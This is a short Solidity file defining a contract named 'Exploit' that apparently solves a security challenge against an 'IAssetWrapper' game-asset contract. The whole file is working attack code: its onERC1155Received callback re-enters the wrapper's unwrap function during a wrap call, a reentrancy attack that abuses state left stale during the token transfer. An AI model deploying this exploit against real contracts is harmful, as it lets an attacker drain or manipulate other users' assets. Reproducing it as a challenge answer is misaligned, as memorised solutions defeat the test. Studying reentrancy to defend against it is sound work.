// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

interface IAssetWrapper {
    function wrap(
        uint256 nftId,
        address assetOwner,
        address assetAddress
    ) external;

    function unwrap(
        address assetOwner,
        address assetAddress
    ) external;
}

interface IERC1155Receiver {
    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4);
}

contract Exploit {
    IAssetWrapper private wrapper;
    address private gameAsset;
    address private owner;

    constructor(address _wrapper) {
        wrapper = IAssetWrapper(_wrapper);
        owner = msg.sender;
    }

    function start(address nft, uint256 nftId) public {
        gameAsset = nft;
        wrapper.wrap(nftId, address(this), nft);
    }

    function onERC1155Received(
        address operator,
        address from,
        uint256 id,
        uint256 value,
        bytes calldata data
    ) external returns (bytes4) {
        require(msg.sender == address(wrapper), "invalid");
        wrapper.unwrap(address(this), gameAsset);
        return IERC1155Receiver.onERC1155Received.selector;
    }
}